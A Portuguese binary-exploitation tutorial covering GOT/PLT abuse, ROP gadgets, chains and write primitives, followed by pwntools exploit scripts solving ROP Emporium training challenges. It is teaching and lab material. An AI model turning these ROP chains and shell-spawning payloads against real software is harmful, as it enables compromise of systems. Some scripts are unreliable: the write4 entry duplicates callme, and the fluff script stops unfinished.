<p>Caso voce nao esteja vendo SROP no momento, pode pular e voltar no futuro!</p>
<p>Eu recomendo que voce pegue o exemplo em <code>man mprotect</code> e brinque com ele + 
<code>strace --trace=mprotect</code> para criar uma intui√ß√£o!</p>
<p>Eu alterei o meu para ficar assim:</p>
<pre><code class="language-C">#include &lt;fcntl.h&gt;
#include &lt;signal.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;

static int alloc_size;
static char* memory;

// gcc c.c -o c

void segv_handler (int signal_number) 
{
 printf (&quot;memory accessed!\n&quot;);
 mprotect (memory, alloc_size, PROT_READ | PROT_WRITE);
} 

void foo() {
 mprotect (memory, alloc_size, 2);
}

int main ()
{
 int fd;
 struct sigaction sa;

 /* Install segv_handler as the handler for SIGSEGV. */
 memset (&amp;sa, 0, sizeof (sa));
 sa.sa_handler = &amp;segv_handler;
 sigaction (SIGSEGV, &amp;sa, NULL);
 
 /* Allocate one page of memory by mapping /dev/zero. Map the memory
   as write-only, initially. */
 alloc_size = getpagesize ();
 fd = open (&quot;/dev/zero&quot;, O_RDONLY);
 memory = mmap (NULL, alloc_size, PROT_WRITE, MAP_PRIVATE, fd, 0);
 close (fd);

 /* Write to the page to obtain a private copy. */
 memory[0] = 0;

 foo();


 /* Write to the allocated memory region. */
 memory[0] = 1;

 /* All done; unmap the memory. */
 printf (&quot;all done\n&quot;);
 munmap (memory, alloc_size);
 return 0;
}
</code></pre>
<p>Eu coloquei a funcao dentro do <code>foo()</code>, caso o gcc esteja colocando ela inline,
vale a pena checar as flags de otimiza√ß√£o!</p>
<p>A funcao fica: </p>
<pre><code class="language-x86asm">   0x00005555555552a7 &lt;+0&gt;:	endbr64 
   0x00005555555552ab &lt;+4&gt;:	push   rbp
   0x00005555555552ac &lt;+5&gt;:	mov    rbp,rsp
   0x00005555555552af &lt;+8&gt;:	mov    eax,DWORD PTR [rip+0x2d63]  # alloc_size
   
b  0x00005555555552b5 &lt;+14&gt;:	movsxd rcx,eax
   
b  0x00005555555552b8 &lt;+17&gt;:	mov    rax,QWORD PTR [rip+0x2d61]  # memory

b  0x00005555555552bf &lt;+24&gt;:	mov    edx,0x2

   0x00005555555552c4 &lt;+29&gt;:	mov    rsi,rcx
   0x00005555555552c7 &lt;+32&gt;:	mov    rdi,rax

b  0x00005555555552ca &lt;+35&gt;:	call   0x555555555150 &lt;mprotect@plt&gt;

   0x00005555555552cf &lt;+40&gt;:	nop
   0x00005555555552d0 &lt;+41&gt;:	pop    rbp
   0x00005555555552d1 &lt;+42&gt;:	ret  
</code></pre>
<p><code>b</code> sao os breakpoints</p>
<p>Em seguida, crie o seguinte gdbscript</p>
<pre><code>disassemble foo

b *foo+14
b *foo+17
b *foo+24
b *foo+35

r
info registers $eax
c
info registers $eax $rcx
c
info registers $rax
c
info registers $edx $rsi $rcx $rdi $rax
</code></pre>
<p>Assim, temos uma vis√£o de todos os registers afetados na funcao! E fica mais 
f√°cil de brincar com o programa, ver o que causa erro, etcetc....</p>
<pre><code class="language-x86asm">Efetivamente, a funcao recebe:
edx = flags
rsi = page size
rdi = addr

Breakpoint 4, 0x00005555555552ca in foo ()
edx            0x2                 2
rsi            0x1000              4096
rdi            0x7ffff7fc7000      140737353904128
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/gotplt.html#resumo">Resumo</a></li>
<li><a href="stack/gotplt.html#perspectiva-de-atacante">Perspectiva de Atacante</a>
<ul>
<li><a href="stack/gotplt.html#relro-parcial">RELRO Parcial</a></li>
<li><a href="stack/gotplt.html#relro-full">RELRO Full</a></li>
</ul>
</li>
<li><a href="stack/gotplt.html#analise-a-fundo-plt-e-ldso-todo">Analise A Fundo PLT e ld.so ~TODO~</a></li>
</ul>
<h1 id="resumo"><a class="header" href="#resumo">Resumo</a></h1>
<ul>
<li>
<p>A GOT armazena o endere√ßo da funcao apos ser resolvido!</p>
</li>
<li>
<p>Quando nos chamamos uma funcao do libc, nao estamos chamando elas  diretamente, e sim a sua entrada na PLT.</p>
</li>
<li>
<p>A PLT checa a GOT, caso o endere√ßo ja tenha sido resolvido, <code>jmp</code> la</p>
</li>
<li>
<p>Caso a funcao <strong>NAO</strong> tenha sido chamada e consequentemente o endere√ßo ainda 
nao tenha sido resolvido, coordena com <code>ld.so</code> para resolver!</p>
</li>
</ul>
<pre><code class="language-x86asm">pwndbg&gt; disassemble vuln
        push   rbp
        mov    rbp,rsp
        sub    rsp,0x20
break &gt; lea    rdi,[rip+0xec3]

        call   0x401030 &lt;puts@plt&gt;

break &gt; lea    rax,[rbp-0x20]
        mov    rdi,rax
        mov    eax,0x0
        call   0x401040 &lt;gets@plt&gt;
        nop
        leave  
        ret

pwndbg&gt; b vuln
pwndbg&gt; b *vuln+20

-------------------------------------
- Antes de puts ter sido executada  -
-------------------------------------

pwndbg&gt; got

GOT protection: Partial RELRO | GOT functions: 2
 
[0x404018] puts@GLIBC_2.2.5 -&gt; 0x401036 (puts@plt+6) ‚óÇ‚Äî push   0 /* 'h' */
[0x404020] gets@GLIBC_2.2.5 -&gt; 0x401046 (gets@plt+6) ‚óÇ‚Äî push   1

pwndbg&gt; disassemble 0x401036
    jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 &lt;puts@got.plt&gt;
    push   0x0
    jmp    0x401020


-------------------------------------
- Depois de puts ter sido executada -
-------------------------------------

pwndbg&gt; got

GOT protection: Partial RELRO | GOT functions: 2
 
[0x404018] puts@GLIBC_2.2.5 -&gt; 0x7ffff7e655f0 (puts) ‚óÇ‚Äî push   r14
[0x404020] gets@GLIBC_2.2.5 -&gt; 0x401046 (gets@plt+6) ‚óÇ‚Äî push   1

</code></pre>
<h1 id="perspectiva-de-atacante"><a class="header" href="#perspectiva-de-atacante">Perspectiva de Atacante</a></h1>
<h2 id="relro-parcial"><a class="header" href="#relro-parcial">RELRO Parcial</a></h2>
<p>Caso o RELRO seja parcial, nos podemos alterar o valor na got, fazendo uma call 
ser redirecionada para, por exemplo, um shellcode!</p>
<p>Esse tipo de cen√°rio pode ser encontrado em vulnerabilidades 
<code>escrever-n-bytes---em-algum-lugar</code> !</p>
<p>Alem disso podemos ler ela e obter um leak, descrito no proximo exemplo!</p>
<h2 id="relro-full"><a class="header" href="#relro-full">RELRO Full</a></h2>
<p>Com RELRO Full, nos podemos somente ler a GOT (que ja vem com valores 
pre-resolvidos).</p>
<p>Porem isso se mostra util pois, podemos mandar esse endereco de volta 
( por meio de um <code>puts</code> por exemplo ) e usar esse leak para desativar ASLR!</p>
<p>Ou podemos calcular a distancia dentro do libc entre a <code>funcao do leak</code> e 
<code>system</code>. </p>
<p>Em seguida ajustar esse valor (<code>pop rbp; add rax, rbp</code>, com <code>rax = leak</code>) e chama-lo: <code>call rax</code>, novamente burlando ASLR! :D</p>
<h1 id="analise-a-fundo-plt-e-ldso-todo"><a class="header" href="#analise-a-fundo-plt-e-ldso-todo">Analise A Fundo PLT e ld.so ~TODO~</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="intro-rop"><a class="header" href="#intro-rop">Intro ROP</a></h1>
<ul>
<li><a href="stack/rop/intro.html#intro-rop">Intro ROP</a></li>
<li><a href="stack/rop/intro.html#teoria">Teoria</a>
<ul>
<li><a href="stack/rop/intro.html#ret">Ret</a></li>
<li><a href="stack/rop/intro.html#gadgets">Gadgets</a></li>
<li><a href="stack/rop/intro.html#chains">Chains</a></li>
</ul>
</li>
<li><a href="stack/rop/intro.html#ferramentas">Ferramentas</a></li>
<li><a href="stack/rop/intro.html#curiosidades">Curiosidades</a></li>
</ul>
<p>ROP (programa√ß√£o orientada ao retorno) foi um t√©cnica desenvolvida 
para burlar todas as limita√ß√µes e mecanismos de seguran√ßa 
impostos no <code>RIP</code>!</p>
<p>Vamos considerar que todas mitiga√ß√µes exceto <code>PIE</code> est√£o ativas!</p>
<h1 id="teoria"><a class="header" href="#teoria">Teoria</a></h1>
<h2 id="ret"><a class="header" href="#ret">Ret</a></h2>
<p>O que faz o <code>RIP</code> ser especial? Em um n√≠vel abstrato, quais sao 
suas propriedades gen√©ricas que o dao sua funcionalidade??</p>
<ul>
<li>[1] ~ O RIP aponta para um endere√ßo na memoria</li>
<li>[2] ~ Em seguida, ele age com base no valor presente</li>
<li>[3] ~ Ele automaticamente avan√ßa (aumenta seu endere√ßo)</li>
<li>[4] ~ jmp [1]</li>
</ul>
<p>Existe algum outro que possa operar dessa maneira? Sim! o <code>RSP</code>! </p>
<p>Quando o processador executa <code>RET</code>, o endere√ßo no topo da stack 
(aonde <code>RSP</code> aponta) sera colocado no <code>RIP</code> e o <code>RSP</code> se ajusta: 
<code>RSP += 8</code>! :D</p>
<h2 id="gadgets"><a class="header" href="#gadgets">Gadgets</a></h2>
<p>Um gadget consiste em uma sequencia de instru√ß√µes, seguidas de um 
<code>RET</code>. Por exemplo:</p>
<pre><code class="language-x86asm">gadget_1:
    mov rax rbx
    mov r12 r13
    ret

gadget_2:
    pop rdi
    pop rbp
    ret

</code></pre>
<p>Vamos supor que apos um BoF, o <code>RIP</code> salvo esta num offset de 40.</p>
<pre><code class="language-py">payload = b&quot;A&quot; * 40
payload += gadget_1
payload += b&quot;B&quot; * 8
</code></pre>
<p>Quando a fun√ß√£o vulner√°vel retornar, o valor no topo da stack sera 
<code>&amp;gadget_1</code></p>
<pre><code class="language-x86asm">vulner√°vel:             stack:
    ...                 AAAAAAAA
    leave               ...
    ret     &lt;- RIP      AAAAAAAA
                        gadget_1 &lt;- RSP
                        BBBBBBBB


A execu√ß√£o sera redirecionada, e o RSP ira avan√ßar


gadget_1:               stack:
    mov rax rbx &lt;- RIP  AAAAAAAA
    mov r12 r13         ...
    ret                 AAAAAAAA
                        gadget_1
                        BBBBBBBB &lt;- RSP

As duas instru√ß√µes ser√£o executadas!

gadget_1:               stack:
    mov rax rbx         AAAAAAAA
    mov r12 r13         ...
    ret     &lt;- RIP      AAAAAAAA
                        gadget_1
                        BBBBBBBB &lt;- RSP

E agora, a funcao retornara para BBBBBBBB, um endere√ßo invalido, gerando uma SEGFAULT
</code></pre>
<p>E caso a instru√ß√£o seja um  <code>POP</code>? o <code>RSP</code> andaria? Sim, e precisamos levar 
isso em considera√ß√£o</p>
<pre><code class="language-py">payload = b&quot;A&quot; * 40
payload += gadget_2
payload += b&quot;T&quot; * 8 # RDI
payload += b&quot;Y&quot; * 8 # RBP
payload += b&quot;B&quot; * 8 # RET
</code></pre>
<p>E vamos supor que os registers sao inicializados com <code>OOOOOOOO</code></p>
<pre><code class="language-x86asm">vulner√°vel:             stack:              
    ...                 AAAAAAAA
    leave               ...
    ret     &lt;- RIP      AAAAAAAA
                        gadget_2 &lt;- RSP
                        TTTTTTTT
                        YYYYYYYY
                        BBBBBBBB


A execu√ß√£o sera redirecionada, e o RSP ira avan√ßar !
Ate aqui foi igual ao anterior!

gadget_2:               stack:              registers:
    pop rdi &lt;- RIP      AAAAAAAA                RDI = OOOOOOOO    
    pop rbp             ...                     RBP = OOOOOOOO
    ret                 AAAAAAAA
                        gadget_2
                        TTTTTTTT &lt;- RSP
                        YYYYYYYY 
                        BBBBBBBB

pop rdi sera executado, salvando o valor no topo da stack em RDI e avan√ßando RSP

gadget_2:               stack:              registers:
    pop rdi             AAAAAAAA                RDI = TTTTTTTT    
    pop rbp &lt;- RIP      ...                     RBP = OOOOOOOO
    ret                 AAAAAAAA
                        gadget_2
                        TTTTTTTT 
                        YYYYYYYY &lt;- RSP
                        BBBBBBBB


pop rbp sera executado, salvando o valor no topo da stack em RBP e avan√ßando RSP

gadget_2:               stack:              registers:
    pop rdi             AAAAAAAA                RDI = TTTTTTTT    
    pop rbp             ...                     RBP = YYYYYYYY
    ret     &lt;- RIP      AAAAAAAA
                        gadget_2
                        TTTTTTTT 
                        YYYYYYYY
                        BBBBBBBB &lt;- RSP

E agora, a funcao retornara para BBBBBBBB, um endere√ßo invalido, gerando uma SEGFAULT
</code></pre>
<h2 id="chains"><a class="header" href="#chains">Chains</a></h2>
<p>E se, ao inv√©s de retornarmos para <code>BBBBBBBB</code>, retorn√°ssemos para outro gadget? </p>
<p>Seria tipo uma corrente: </p>
<p>___com um gadget executando e redirecionando para o proximo....</p>
<p>___com um gadget executando e redirecionando para o proximo....</p>
<p>___com um gadget executando e redirecionando para o proximo....</p>
<p>___com um gadget executando e redirecionando para o proximo....</p>
<p>Assim, poder√≠amos devagarinho reconstruir o nosso shellcode, a partir de partes 
pre-existentes do c√≥digo!</p>
<p>E como <code>PIE</code> esta desativado, a secao de c√≥digo do bin√°rio NAO tem seu 
endere√ßo randomizado!</p>
<blockquote>
<p>OBS: Voce nao pode usar a secao de c√≥digo do libc como gadgets, pois ele tem 
o endere√ßo randomizado (ASLR)</p>
</blockquote>
<pre><code class="language-x86asm">gadget_1:
    mov rax rbx
    mov r12 r13
    ret

gadget_2:
    pop rdi
    pop rbp
    ret
</code></pre>
<pre><code class="language-py">payload = b&quot;A&quot; * 40
payload += gadget_1
payload += gadget_2 
payload += b&quot;T&quot; * 8 # RDI
payload += b&quot;Y&quot; * 8 # RBP
payload += gadget_1
payload += gadget_1
payload += gadget_1
payload += gadget_2 
payload += b&quot;T&quot; * 8 # RDI
payload += b&quot;Y&quot; * 8 # RBP
payload += gadget_1
payload += b&quot;B&quot; * 8 # SEGFAULT
</code></pre>
<p>Essa chain em especifico nao faz nada de util, somente demonstrar como chains 
podem ser construidas!</p>
<p>Numa situa√ß√£o real nao ter√≠amos uma <code>SEGFAULT</code> no final, pois ja ter√≠amos uma 
shell antes de chegar a esse ponto!</p>
<h1 id="ferramentas"><a class="header" href="#ferramentas">Ferramentas</a></h1>
<p>Existem m√∫ltiplas ferramentas capazes de encontrar gadgets e ate gerar chains 
automaticamente!</p>
<p>Eu recomendo voce testar e ver o que prefere!</p>
<ul>
<li><a href="https://github.com/Boyan-MILANOV/ropium">ropium</a></li>
<li><a href="https://github.com/sashs/Ropper">ropper</a></li>
<li><a href="https://github.com/JonathanSalwan/ROPgadget">ropGadget</a></li>
<li><a href="https://docs.pwntools.com/en/latest/rop.html">O submodulo do pwntools</a></li>
</ul>
<hr />
<p>E enquanto eu pegava os links no github..
eu encontrei esse em rust:
<a href="https://github.com/Ben-Lichtman/ropr/tree/master/src">ropr</a></p>
<p>Que parece ser bem interessante, mas ainda vou testar!</p>
<hr />
<p>Todas as ferramentas possuem funcionalidade de filtrar gadgets com badchars, 
automaticamente gerar chains...</p>
<p>Eu pessoalmente gosto de ropper e do pwntools (pq ter tudo dentro do mesmo 
framework == incr√≠vel)</p>
<h1 id="curiosidades"><a class="header" href="#curiosidades">Curiosidades</a></h1>
<p>Em arquiteturas <code>RISC</code>, todas as instru√ß√µes tem o mesmo tamanho (em bytes)...</p>
<p>Porem em <code>x86</code> (<code>CISC</code>), as instru√ß√µes podem desde 2 bytes, ate 5/6/7 bytes!</p>
<p>Assim, as ferramentas que encontram gadgets podem criar instru√ß√µes que 
originalmente nao existiam no programa!</p>
<pre><code>Exemplo (fict√≠cio, pq eu to com pregui√ßa ler o manual e ver os bytecodes)

O programa originalmente ve:

12 34   56 78 91    12 34  90
|       |           |      |
Add     Pop         Add    NOP

Porem, a ferramenta pode escolher um offset com alinhamento diferente do anterior:

12      34 56 78    91 12   34 90
|       |           |       |
AND     Sub         Push    XOR

Mesmos bytes, instru√ß√µes diferentes

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/rop/primitivos.html#primitivos">Primitivos</a></li>
<li><a href="stack/rop/primitivos.html#classifica%C3%A7%C3%A3o">Classifica√ß√£o</a>
<ul>
<li><a href="stack/rop/primitivos.html#write---what---where">Write - What - Where</a>
<ul>
<li><a href="stack/rop/primitivos.html#exemplo">Exemplo</a></li>
</ul>
</li>
<li><a href="stack/rop/primitivos.html#write---something---where">Write - Something - Where</a></li>
<li><a href="stack/rop/primitivos.html#modificador">Modificador</a></li>
</ul>
</li>
<li><a href="stack/rop/primitivos.html#incomuns">Incomuns</a></li>
<li><a href="stack/rop/primitivos.html#dicas">Dicas</a>
<ul>
<li><a href="stack/rop/primitivos.html#valores-pre-modificados">Valores pre modificados</a></li>
<li><a href="stack/rop/primitivos.html#alinhamento-da-stack">Alinhamento da stack</a></li>
</ul>
</li>
</ul>
<h1 id="primitivos"><a class="header" href="#primitivos">Primitivos</a></h1>
<p>Primitivos sao a base dos exploits modernos, um primitivo pode ser desde uma 
sequencia especifica de gadgets, fun√ß√µes, etcetc.</p>
<p>Normalmente, voce vai adicionar fun√ß√µes aos seus scripts que usem o primitivo, 
acelerando a velocidade de desenvolvimento dos exploits.</p>
<h1 id="classifica√ß√£o-1"><a class="header" href="#classifica√ß√£o-1">Classifica√ß√£o</a></h1>
<h2 id="write---what---where"><a class="header" href="#write---what---where">Write - What - Where</a></h2>
<p>Esse primitivo te permite escrever algo (what) em algum lugar, esse algo pode 
ser desde 1 byte, ate uma qword inteira!</p>
<h3 id="exemplo"><a class="header" href="#exemplo">Exemplo</a></h3>
<p>Uma chain que escreve um byte em um local:</p>
<pre><code class="language-x86asm">gadget_pop_rdi:
    pop rdi
    ret

gadget_pop_rax:
    pop r13
    pop rax
    pop r12
    xor r13 r12
    ret

gadget_mov_rdi_al:
    mov [rdi] al
    pop r14
    ret
</code></pre>
<p>Gadgets normalmente nao sao exatamente o que a gente precisa, ent√£o as vezes 
precisamos ocupar a stack com &quot;lixinho&quot; para compensar!</p>
<p>Sim... esse e o nome t√©cnico correto! E nao tem argumento que me va me 
convencer do contrario!</p>
<pre><code class="language-py">def write_byte(what, where);
    temp = b&quot;&quot;                  # Lixo  # Util
    temp += gadget_pop_rdi      
    temp += p64(where)                  # rdi
    temp += gadget_pop_rax      
    temp += b&quot;A&quot;*8              # r13
    temp += p64(what)                   # rax
    temp += b&quot;B&quot;*8              # r12
    temp += gadget_mov_rdi_al           # mov [rdi] al
    temp += b&quot;C&quot;*8              # r14
    
    return temp
</code></pre>
<p>E nos poder√≠amos usar assim:</p>
<pre><code class="language-py">payload = b'A'*40
data_seg = 0x00601028
for c in b&quot;/bin/sh\x00&quot;:
	payload += write_byte(c, data_seg)
	data_seg += 1

payload += gadget_pop_rdi
payload += p64(0x00601028)    # data_seg inicial: pointer para /bin/sh
payload += p64(libc.sym.system) 
</code></pre>
<h2 id="write---something---where"><a class="header" href="#write---something---where">Write - Something - Where</a></h2>
<p>Voce escreve alguma coisa (voce nao controla) em algum lugar (voce controla)</p>
<p>o <code>mov [rdi] al</code> poderia ser substitu√≠do por:
<code>mov [rdi] 0x7f 1e 1f 60 00 00 00 00</code></p>
<p>Assim, podemos escrever esse valor fixo, em um endere√ßo que nos controlamos!</p>
<p>Pode util ser em ROP chains caso voce possua um modificador.</p>
<p>Uma fonte comum desse primitivo sao unlinks parciais no heap (unsorted bins attack)</p>
<h2 id="modificador"><a class="header" href="#modificador">Modificador</a></h2>
<p>add, xor, sub, .... todas essas instru√ß√µes nos permitem alterar os bytes que 
ja est√£o na memoria!</p>
<p>E similar aos writes, a quantidade de controle que possu√≠mos pode variar!</p>
<p><code>pop rdx; add [rdx] 0x02;</code> Somente controlamos o endere√ßo!</p>
<p>Caso tenhamos um <code>xor</code>, a situa√ß√£o ideal seria a memoria = <code>0xff</code></p>
<p>Caso seja um <code>add</code>, e a memoria <code>0x00</code>, nos possu√≠mos um write super simples!</p>
<p>E assim por diante!</p>
<h1 id="incomuns"><a class="header" href="#incomuns">Incomuns</a></h1>
<p>Existem outros primitivos que sao mais raros, ent√£o somente irei explicar 
quando for util. Por exemplo o <code>write refletido</code>: explicado no 
tutorial de unsafe unlink!</p>
<p>Porem vou colocar os links aqui caso voce esteja procurando por algum especifico! :D</p>
<h1 id="dicas"><a class="header" href="#dicas">Dicas</a></h1>
<h2 id="valores-pre-modificados"><a class="header" href="#valores-pre-modificados">Valores pre modificados</a></h2>
<p>Similar ao lixinho para os <code>pops</code>, e eu nao sabia aonde colocar! hehe :D</p>
<p>As vezes, um gadget muito util acaba tendo efeito colateral nos nossos valores!</p>
<p>Por exemplo, vamos supor que somente exista um gadget que nos permita alterar rdi!</p>
<pre><code class="language-x86asm">gadget_rdi:
    pop rdi
    add rdi 0x1234 
    ret

gadget_pop_rax:
    pop r13
    pop rax
    pop r12
    xor r13 r12
    ret

gadget_mov_rdi_al:
    mov [rdi] al
    pop r14
    ret
</code></pre>
<p>Os outros gadgets est√£o inalterados!</p>
<pre><code class="language-py">def write_byte(what, where);
    temp = b&quot;&quot;                  # Lixo  # Util
    temp += gadget_pop_rdi


    temp += p64(where - 0x1234)         # rdi
    
    
    temp += gadget_pop_rax      
    temp += b&quot;A&quot;*8              # r13
    temp += p64(what)                   # rax
    temp += b&quot;B&quot;*8              # r12

    temp += b&quot;B&quot;*8              # r12
    temp += gadget_mov_rdi_al           # mov [rdi] al
    temp += b&quot;C&quot;*8              # r14
    
    return temp
</code></pre>
<h2 id="alinhamento-da-stack"><a class="header" href="#alinhamento-da-stack">Alinhamento da stack</a></h2>
<p>Voce precisa garantir o alinhamento da stack de acordo com a arquitetura:</p>
<ul>
<li>x86 -&gt; 4 bytes -&gt; p32()</li>
<li>x86_64 -&gt; 8 bytes -&gt; p64()</li>
</ul>
<p>Mesmo que o valor seja so um byte, voce precisa garantir o alinhamento da 
stack! Pois o <code>pop</code> vai retirar 4 ou 8 bytes independentemente! Assim, 
estragando o endere√ßo do proximo gadget na chain!</p>
<p>Caso o bytes va para <code>al</code>, <code>p64(0x41) </code>ja basta!</p>
<p>Mas caso o valor para <code>al</code> voce precisa fazer <code>p64(0x4100)</code> ou <code>b&quot;\x00&quot;*7 + b&quot;\x41&quot; + b&quot;\x00&quot;</code></p>
<div style="break-before: page; page-break-before: always;"></div><p>Aqui tao minhas solucoes, em breve vou escrever um tutorial, mas por enquanto
e isso :(</p>
<ul>
<li><a href="stack/rop/ROPE/dump.html#sha256">sha256</a></li>
<li><a href="stack/rop/ROPE/dump.html#ret2win">ret2win</a></li>
<li><a href="stack/rop/ROPE/dump.html#split">split</a></li>
<li><a href="stack/rop/ROPE/dump.html#callme">callme</a></li>
<li><a href="stack/rop/ROPE/dump.html#write4">write4</a></li>
<li><a href="stack/rop/ROPE/dump.html#badchars">badchars</a></li>
<li><a href="stack/rop/ROPE/dump.html#fluff">fluff</a></li>
</ul>
<h1 id="sha256"><a class="header" href="#sha256">sha256</a></h1>
<p>E as sha256 pq eu percebi q os desafios foram alterados com o passar do tempo </p>
<pre><code>$ sha256sum 0-ret2win/ret2win 1-split/split 1-split/split 2-callme/callme 3-write4/write4 4-badchars/badchars 5-fluff/fluff

824893a58502620cbfe8bce7d362cf96b5eb484b78291b1371fd7a2b8086c1d6  0-ret2win/ret2win
bf9af5d3618c33c800f577065a4773fb12b6e88390552dd766efa013ebad40f9  1-split/split
bf9af5d3618c33c800f577065a4773fb12b6e88390552dd766efa013ebad40f9  1-split/split
38b3aac5f11e673ecfbe344f9330d7dfa7d6921be506a948ab9d0347af756acb  2-callme/callme
15c9fc1d4dff1874633caebd212d4990243b072f9352baa23daf07f39a93f8cd  3-write4/write4
5308289f3937a34e4c5eac818e394217f5f22c6f21fbb0f6dc6b8e3f771deb8b  4-badchars/badchars
e5335795104d861dc5e54c8734e090f1c7dfd5b642e4607c2747aed7529c724d  5-fluff/fluff
</code></pre>
<h1 id="ret2win"><a class="header" href="#ret2win">ret2win</a></h1>
<pre><code>O programa fala o tamanho ate o RIP (40), e voc√™ pode usar o truque mencionado
no enunciado para testar.

Ai √© s√≥ usar objdump |  grep ret2win para pegar o endere√ßo
	 python3 -c &quot;print('A'*40+'\x56\x07\x40',end='')&quot; |./ret2win 
Truque pra tirar a newline (se n√£o, n√£o funciona)
</code></pre>
<h1 id="split"><a class="header" href="#split">split</a></h1>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

	# sys arg on RDI
    # https://godbolt.org/z/691asM

#gadgets
system = p64(0x40074b)
# gdb&gt; print system:  0x400560
# That one is a addr to call_system (usefulFunction)

# ROPgadget or ropium
pop_rdi_ret = p64(0x4007c3)

# strings
# rabin -z   or   r2&gt; iz 
ls = p64(0x0040084a)
cat = p64(0x00601060)

buf = b'A'*40 # Pad
# buf += p64(0x00400742)
# usefulFunction -&gt; test offset
buf += pop_rdi_ret
buf += cat
buf += system

binary = ELF(&quot;./split&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)
io.sendline(buf)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recvuntil(&quot;}&quot;))
io.close()k
</code></pre>
<h1 id="callme"><a class="header" href="#callme">callme</a></h1>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

# Strings
args = p64(0xdeadbeefdeadbeef)
args += p64(0xcafebabecafebabe)
args += p64(0xd00df00dd00df00d)

# Gadgets
useful = p64(0x000000000040093c)
    # pop rdi, rsi, rdx
    # calling convention:
    #    rdi rsi rdx rcx

# Funcs (gdb print)
callone = p64(0x7ffff7dc881a)
calltwo = p64(0x7ffff7dc892b)
callthree = p64(0x7ffff7dc8a2d)

payload = b'A'*40
for func in [callone, calltwo, callthree]:
    payload += useful
    payload += args
    payload += func


binary = ELF(&quot;./callme&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)
io.sendline(payload)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recv(512))
io.close()
</code></pre>
<h1 id="write4"><a class="header" href="#write4">write4</a></h1>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

# Strings
args = p64(0xdeadbeefdeadbeef)
args += p64(0xcafebabecafebabe)
args += p64(0xd00df00dd00df00d)

# Gadgets
useful = p64(0x000000000040093c)
    # pop rdi, rsi, rdx
    # calling convention:
    #    rdi rsi rdx rcx

# Funcs (gdb print)
callone = p64(0x7ffff7dc881a)
calltwo = p64(0x7ffff7dc892b)
callthree = p64(0x7ffff7dc8a2d)

payload = b'A'*40
for func in [callone, calltwo, callthree]:
    payload += useful
    payload += args
    payload += func


binary = ELF(&quot;./callme&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)
io.sendline(payload)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recv(512))
io.close()
</code></pre>
<h1 id="badchars"><a class="header" href="#badchars">badchars</a></h1>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

binary = ELF(&quot;./badchars&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)

# But on data+6 there is a bad byte on the addr
# Because we wouldnt be able to fix the bad byte if the addr was also bad, we do a +3
# Other solutions:
#       If we had a-&gt; add [REG+123whatever] 123whatever
#       or walking with inc-&gt; REG=data_seg; 6*(inc REG); add [reg] 122whatever
#       maybe ret2csu?

# Gadgets (usefulGadgets + ropper --file badchars -b 7867612e)
write8_r13_r12 = p64(0x0000000000400634)
pop_r12_r13 = p64(0x000000000040069c)  # r12 r13 r14 r15
pop_rdi = p64(0x00000000004006a3)
pop_r14_r15 = p64(0x00000000004006a0)
sub1_r15_r14b = p64(0x0000000000400630)

bad = [ord('x'), ord('g'), ord('a'), ord('.')]
data_seg = 0x00601028 +3

# Funcs
def arbwrite8(addr, val): 
    temp = pop_r12_r13 +val +p64(addr)
    temp += b'B'*16 # fill r14 r15 
    return temp + write8_r13_r12
def arbsub1(addr, val): return pop_r14_r15 +val*8 +p64(addr) +sub1_r15_r14b

# Initial write
payload = b'A'*40
payload += arbwrite8(data_seg, b&quot;\xff/fl\xff\xff\xfft&quot;) # FF as placeholder
payload += arbwrite8(data_seg+8, b&quot;\xfft&quot;+b'\x00'*6)

# Fix bad bytes
payload += arbsub1(data_seg+0, b'\xd1') # .
                                        # /
                                        # f
                                        # l
payload += arbsub1(data_seg+4, b'\x9e') # a
payload += arbsub1(data_seg+5, b'\x98') # g
payload += arbsub1(data_seg+6, b'\xd1') # . # addr contains bad char w/o shift
                                        # t
payload += arbsub1(data_seg+8, b'\x87') # x
                                        # t
# Load pointer and call print_file
payload += pop_rdi
payload += p64(data_seg)
payload += p64(io.elf.plt['print_file'])

io.sendline(payload)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recv(512))
io.close()
</code></pre>
<h1 id="fluff"><a class="header" href="#fluff">fluff</a></h1>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

# https://www.felixcloutier.com/x86/xlat:xlatb
# https://www.tutorialspoint.com/assembly_programming/assembly_stos_instruction.htm
# https://www.felixcloutier.com/x86/bextr

binary = ELF(&quot;./fluff&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)

# Gadgets
bextr_rbx = p64(0x000000000040062a)
	# pop    rdx	
   	# pop    rcx
   	# add    rcx,0x3ef2
   	# bextr  rbx,rcx,rdx

xlat_al_rbx = p64(0x0000000000400628)
# Set AL to memory byte [RBX + unsigned AL].

pop_rdi = p64(0x00000000004006a3)
stosb_rdi_al = p64(0x0000000000400639) 

# funcs
def mov_rbx(val):
	rcx = p64(val - 0x3ef2)
	rdx = p64(0x4000)
	# [0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
	#  |                       |                 |
	#  16    num_bits=64       7  start_bit=0    0
	# bextr will copy 64 bits from rcx, 
	# starting on bit 0. Then save it on rbx
	return bextr_rbx +rdx +rcx

payload = b'A'*40
al = 0xb # al starts = 0xb
data_seg = 0x00601028
for c in b&quot;flag.txt&quot;:
	# Load char to al
	b = next(binary.search(c)) - al
	payload += mov_rbx(b)
	payload += xlat_al_rbx
	al = c

	# Load addr to rdi
	payload += pop_rdi
	payload += p64(data_seg)
	data_seg += 1

	# write
	payload += stosb_rdi_al

